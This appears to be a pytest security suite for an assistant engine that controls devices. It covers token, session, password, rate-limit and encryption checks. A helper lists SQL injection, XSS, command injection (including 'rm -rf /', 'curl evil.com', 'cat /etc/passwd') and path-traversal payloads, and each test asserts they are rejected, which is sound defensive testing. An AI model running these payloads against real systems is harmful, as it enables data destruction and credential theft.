"""
Security testing for consciousness system.
Tests authentication, authorization, input validation, and vulnerability prevention.
"""
import hashlib
import json
import secrets
from datetime import datetime, timedelta
from unittest.mock import AsyncMock, patch

import pytest

from consciousness.api.main import app
from consciousness.core.consciousness_engine import ConsciousnessEngine
from consciousness.security.auth_manager import AuthManager
from consciousness.security.input_validator import InputValidator


class SecurityTestHelper:
    """Helper class for security testing utilities."""

    @staticmethod
    def generate_malicious_payloads():
        """Generate various malicious payloads for testing."""
        return {
            "sql_injection": [
                "'; DROP TABLE users; --",
                "' OR '1'='1",
                "1; DELETE FROM devices WHERE 1=1; --",
                "admin'--",
                "' UNION SELECT password FROM users--",
            ],
            "xss_payloads": [
                "<script>alert('xss')</script>",
                "javascript:alert('xss')",
                "<img src=x onerror=alert('xss')>",
                "'\"><script>alert('xss')</script>",
                "<svg onload=alert('xss')>",
            ],
            "command_injection": [
                "; rm -rf /",
                "| cat /etc/passwd",
                "&& curl evil.com",
                "`whoami`",
                "$(id)",
            ],
            "path_traversal": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2f%etc%2fpasswd",
            ],
            "large_inputs": [
                "A" * 10000,  # 10KB string
                "B" * 100000,  # 100KB string
                json.dumps({"key": "C" * 1000}) * 100,  # Large JSON
            ],
        }


@pytest.fixture
async def auth_manager():
    """Create auth manager for testing."""
    mock_session = AsyncMock()
    manager = AuthManager(mock_session)
    return manager


@pytest.fixture
def input_validator():
    """Create input validator for testing."""
    return InputValidator()


@pytest.fixture
async def authenticated_engine():
    """Create consciousness engine with authentication."""
    with patch("consciousness.database.get_async_session") as mock_session_gen:
        mock_session = AsyncMock()
        mock_session_gen.return_value.__anext__ = AsyncMock(return_value=mock_session)
        mock_session_gen.return_value.aclose = AsyncMock()

        engine = ConsciousnessEngine()
        await engine.initialize()

        # Add authentication layer
        engine.auth_manager = AuthManager(mock_session)

        yield engine
        await engine.stop()


@pytest.mark.asyncio
async def test_authentication_token_validation(auth_manager):
    """Test JWT token validation and security."""
    # Test valid token creation
    user_data = {
        "user_id": "user_123",
        "username": "testuser",
        "permissions": ["read", "write"],
    }

    token = await auth_manager.create_token(user_data)
    assert token is not None
    assert len(token) > 50  # Reasonable token length

    # Test token validation
    validated_data = await auth_manager.validate_token(token)
    assert validated_data["user_id"] == user_data["user_id"]
    assert validated_data["username"] == user_data["username"]
    assert validated_data["permissions"] == user_data["permissions"]

    # Test expired token
    expired_token = await auth_manager.create_token(
        user_data, expires_in=-3600  # Expired 1 hour ago
    )

    with pytest.raises(Exception):  # Should raise authentication error
        await auth_manager.validate_token(expired_token)


@pytest.mark.asyncio
async def test_authentication_tampered_token(auth_manager):
    """Test detection of tampered tokens."""
    user_data = {"user_id": "user_123", "username": "testuser"}

    # Create valid token
    valid_token = await auth_manager.create_token(user_data)

    # Tamper with token
    tampered_token = valid_token[:-10] + "tampered123"

    # Should reject tampered token
    with pytest.raises(Exception):
        await auth_manager.validate_token(tampered_token)

    # Test malformed tokens
    malformed_tokens = [
        "invalid.token.format",
        "notatoken",
        "",
        "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.invalid",
        "valid.header.invalid_signature",
    ]

    for malformed in malformed_tokens:
        with pytest.raises(Exception):
            await auth_manager.validate_token(malformed)


@pytest.mark.asyncio
async def test_sql_injection_prevention(authenticated_engine, input_validator):
    """Test prevention of SQL injection attacks."""
    engine = authenticated_engine
    helper = SecurityTestHelper()

    sql_payloads = helper.generate_malicious_payloads()["sql_injection"]

    for payload in sql_payloads:
        # Test query input validation
        is_safe = input_validator.validate_query_input(payload)
        assert is_safe is False, f"SQL injection payload should be rejected: {payload}"

        # Test query processing with malicious input
        try:
            response = await engine.process_query(payload)
            # If processing succeeds, ensure no SQL was executed
            assert "error" in response.lower() or "invalid" in response.lower()
        except Exception:
            # Exception is acceptable for malicious input
            pass


@pytest.mark.asyncio
async def test_xss_prevention(input_validator):
    """Test prevention of XSS attacks."""
    helper = SecurityTestHelper()
    xss_payloads = helper.generate_malicious_payloads()["xss_payloads"]

    for payload in xss_payloads:
        # Test XSS payload detection
        is_safe = input_validator.validate_user_input(payload)
        assert is_safe is False, f"XSS payload should be rejected: {payload}"

        # Test sanitization
        sanitized = input_validator.sanitize_input(payload)
        assert "<script>" not in sanitized.lower()
        assert "javascript:" not in sanitized.lower()
        assert "onerror=" not in sanitized.lower()


@pytest.mark.asyncio
async def test_command_injection_prevention(input_validator):
    """Test prevention of command injection attacks."""
    helper = SecurityTestHelper()
    command_payloads = helper.generate_malicious_payloads()["command_injection"]

    for payload in command_payloads:
        # Test command injection detection
        is_safe = input_validator.validate_device_command(payload)
        assert is_safe is False, f"Command injection should be rejected: {payload}"

        # Test device control input validation
        device_command = {
            "device_id": "device_001",
            "action": payload,
            "parameters": {},
        }

        is_valid = input_validator.validate_device_control_request(device_command)
        assert is_valid is False


@pytest.mark.asyncio
async def test_path_traversal_prevention(input_validator):
    """Test prevention of path traversal attacks."""
    helper = SecurityTestHelper()
    path_payloads = helper.generate_malicious_payloads()["path_traversal"]

    for payload in path_payloads:
        # Test path traversal detection
        is_safe = input_validator.validate_file_path(payload)
        assert is_safe is False, f"Path traversal should be rejected: {payload}"

        # Test file access validation
        try:
            normalized_path = input_validator.normalize_path(payload)
            # Should not contain parent directory references
            assert ".." not in normalized_path
            assert not normalized_path.startswith("/etc/")
            assert not normalized_path.startswith("/windows/")
        except Exception:
            # Exception is acceptable for malicious paths
            pass


@pytest.mark.asyncio
async def test_input_size_limits(input_validator):
    """Test input size limitations."""
    helper = SecurityTestHelper()
    large_inputs = helper.generate_malicious_payloads()["large_inputs"]

    for large_input in large_inputs:
        # Test oversized input rejection
        is_valid = input_validator.validate_input_size(large_input)

        if len(large_input) > input_validator.MAX_INPUT_SIZE:
            assert is_valid is False, "Oversized input should be rejected"

        # Test query processing with large input
        try:
            is_safe = input_validator.validate_query_input(large_input)
            if not is_safe:
                continue  # Expected for oversized input
        except Exception:
            # Exception acceptable for oversized input
            pass


@pytest.mark.asyncio
async def test_rate_limiting(authenticated_engine):
    """Test rate limiting protection."""
    engine = authenticated_engine

    # Simulate rapid requests from same source
    request_count = 100
    success_count = 0
    rate_limited_count = 0

    for i in range(request_count):
        try:
            response = await engine.process_query(f"Query {i}")
            success_count += 1
        except Exception as e:
            if "rate limit" in str(e).lower():
                rate_limited_count += 1

    # Should have some rate limiting after many rapid requests
    if request_count > 50:
        assert rate_limited_count > 0, "Rate limiting should activate under high load"

    # Success rate should still be reasonable
    success_rate = success_count / request_count
    assert success_rate > 0.3, "Some requests should succeed even with rate limiting"


@pytest.mark.asyncio
async def test_session_security(auth_manager):
    """Test session management security."""
    user_data = {"user_id": "user_123", "username": "testuser"}

    # Test session creation
    session_id = await auth_manager.create_session(user_data)
    assert session_id is not None
    assert len(session_id) >= 32  # Secure session ID length

    # Test session validation
    session_data = await auth_manager.get_session(session_id)
    assert session_data["user_id"] == user_data["user_id"]

    # Test session expiration
    await auth_manager.expire_session(session_id)

    with pytest.raises(Exception):
        await auth_manager.get_session(session_id)

    # Test session hijacking protection
    fake_session_id = "fake_session_123"
    with pytest.raises(Exception):
        await auth_manager.get_session(fake_session_id)


@pytest.mark.asyncio
async def test_password_security(auth_manager):
    """Test password handling security."""
    # Test password hashing
    password = "test_password_123"
    hashed = auth_manager.hash_password(password)

    assert hashed != password  # Should be hashed
    assert len(hashed) > 50  # Reasonable hash length
    assert hashed.startswith("$")  # Should use proper hash format

    # Test password verification
    assert auth_manager.verify_password(password, hashed) is True
    assert auth_manager.verify_password("wrong_password", hashed) is False

    # Test weak password rejection
    weak_passwords = [
        "123456",
        "password",
        "admin",
        "test",
        "a",  # Too short
        "12345678",  # No complexity
    ]

    for weak_password in weak_passwords:
        is_strong = auth_manager.validate_password_strength(weak_password)
        assert is_strong is False, f"Weak password should be rejected: {weak_password}"

    # Test strong password acceptance
    strong_passwords = ["MyStr0ngP@ssw0rd!", "C0mpl3x_P@ssw0rd_123", "S3cur3#Pa$$word!"]

    for strong_password in strong_passwords:
        is_strong = auth_manager.validate_password_strength(strong_password)
        assert (
            is_strong is True
        ), f"Strong password should be accepted: {strong_password}"


@pytest.mark.asyncio
async def test_privilege_escalation_prevention(authenticated_engine):
    """Test prevention of privilege escalation attacks."""
    engine = authenticated_engine

    # Test with low-privilege user
    low_privilege_user = {
        "user_id": "user_123",
        "username": "regular_user",
        "permissions": ["read"],  # Only read permission
    }

    # Should not be able to perform admin actions
    admin_queries = [
        "Delete all device data",
        "Change system configuration",
        "Access user credentials",
        "Modify security settings",
        "Grant admin permissions",
    ]

    for query in admin_queries:
        try:
            response = await engine.process_query(query, user=low_privilege_user)
            # If processed, should indicate insufficient permissions
            assert (
                "permission" in response.lower() or "unauthorized" in response.lower()
            )
        except Exception as e:
            # Exception for unauthorized access is acceptable
            assert "permission" in str(e).lower() or "unauthorized" in str(e).lower()


@pytest.mark.asyncio
async def test_data_exposure_prevention(authenticated_engine):
    """Test prevention of sensitive data exposure."""
    engine = authenticated_engine

    # Queries attempting to access sensitive information
    sensitive_queries = [
        "Show me all user passwords",
        "What are the database credentials?",
        "Display system API keys",
        "Show authentication tokens",
        "What is the encryption key?",
        "Display database connection string",
    ]

    for query in sensitive_queries:
        response = await engine.process_query(query)

        # Response should not contain sensitive patterns
        response_lower = response.get("response", "").lower()

        sensitive_patterns = [
            "password:",
            "api_key:",
            "secret:",
            "token:",
            "credential:",
            "connection_string:",
            "$2b$",  # bcrypt hash prefix
            "bearer ",
            "jwt ",
        ]

        for pattern in sensitive_patterns:
            assert (
                pattern not in response_lower
            ), f"Response should not expose: {pattern}"


@pytest.mark.asyncio
async def test_encryption_validation(auth_manager):
    """Test encryption implementations."""
    # Test data encryption
    sensitive_data = "sensitive_user_information_123"

    encrypted = auth_manager.encrypt_data(sensitive_data)
    assert encrypted != sensitive_data  # Should be encrypted
    assert len(encrypted) > len(sensitive_data)  # Encrypted data is longer

    # Test decryption
    decrypted = auth_manager.decrypt_data(encrypted)
    assert decrypted == sensitive_data

    # Test encryption key rotation
    old_key = auth_manager.current_encryption_key
    auth_manager.rotate_encryption_key()
    new_key = auth_manager.current_encryption_key

    assert old_key != new_key  # Key should change

    # Old encrypted data should still be decryptable
    decrypted_with_old_key = auth_manager.decrypt_data(
        encrypted, key_version="previous"
    )
    assert decrypted_with_old_key == sensitive_data


@pytest.mark.asyncio
async def test_audit_logging(authenticated_engine):
    """Test security audit logging."""
    engine = authenticated_engine

    # Mock audit logger
    audit_logs = []

    async def mock_audit_log(event_type, user_id, details):
        audit_logs.append(
            {
                "event_type": event_type,
                "user_id": user_id,
                "details": details,
                "timestamp": datetime.now(),
            }
        )

    engine.audit_logger = mock_audit_log

    # Perform actions that should be audited
    await engine.process_query("Test query", user={"user_id": "user_123"})

    # Check audit logs
    assert len(audit_logs) > 0

    log_entry = audit_logs[0]
    assert log_entry["event_type"] in ["query_processed", "user_action"]
    assert log_entry["user_id"] == "user_123"
    assert log_entry["timestamp"] is not None


@pytest.mark.asyncio
async def test_secure_communication(authenticated_engine):
    """Test secure communication requirements."""
    engine = authenticated_engine

    # Test HTTPS requirement
    insecure_request = {"scheme": "http", "host": "localhost", "query": "Test query"}

    # Should reject or redirect insecure connections
    try:
        response = await engine.process_request(insecure_request)
        assert "https" in response.get("redirect", "").lower()
    except Exception as e:
        assert "secure" in str(e).lower() or "https" in str(e).lower()

    # Test secure headers
    secure_request = {"scheme": "https", "host": "localhost", "query": "Test query"}

    response = await engine.process_request(secure_request)
    headers = response.get("headers", {})

    # Check for security headers
    security_headers = [
        "X-Content-Type-Options",
        "X-Frame-Options",
        "X-XSS-Protection",
        "Strict-Transport-Security",
    ]

    for header in security_headers:
        assert header in headers, f"Missing security header: {header}"


@pytest.mark.asyncio
async def test_dependency_vulnerabilities():
    """Test for known vulnerabilities in dependencies."""
    import json
    import subprocess

    try:
        # Run security audit (if available)
        result = subprocess.run(
            ["python", "-m", "pip", "list", "--format=json"],
            capture_output=True,
            text=True,
            timeout=30,
        )

        if result.returncode == 0:
            packages = json.loads(result.stdout)

            # Check for packages with known vulnerabilities
            vulnerable_packages = [
                "django<3.2.13",  # Example vulnerable versions
                "requests<2.20.0",
                "urllib3<1.24.2",
            ]

            installed_packages = {
                pkg["name"].lower(): pkg["version"] for pkg in packages
            }

            for vuln_spec in vulnerable_packages:
                pkg_name = vuln_spec.split("<")[0].lower()
                if pkg_name in installed_packages:
                    # Additional vulnerability checks would go here
                    print(f"Found package {pkg_name} - verify security status")

    except (subprocess.TimeoutExpired, FileNotFoundError):
        # Skip if pip audit not available
        pass


@pytest.mark.asyncio
async def test_security_configuration_validation():
    """Test security configuration requirements."""
    # Test configuration security
    security_config = {
        "debug_mode": False,
        "secure_cookies": True,
        "session_timeout": 3600,
        "password_policy": {
            "min_length": 8,
            "require_special_chars": True,
            "require_numbers": True,
            "require_uppercase": True,
        },
        "rate_limiting": {"enabled": True, "max_requests_per_minute": 60},
        "encryption": {"algorithm": "AES-256-GCM", "key_rotation_days": 30},
    }

    # Validate security settings
    assert (
        security_config["debug_mode"] is False
    ), "Debug mode should be disabled in production"
    assert security_config["secure_cookies"] is True, "Secure cookies should be enabled"
    assert (
        security_config["session_timeout"] <= 3600
    ), "Session timeout should be reasonable"
    assert (
        security_config["password_policy"]["min_length"] >= 8
    ), "Password minimum length should be at least 8"
    assert (
        security_config["rate_limiting"]["enabled"] is True
    ), "Rate limiting should be enabled"
    assert (
        "AES" in security_config["encryption"]["algorithm"]
    ), "Should use strong encryption"
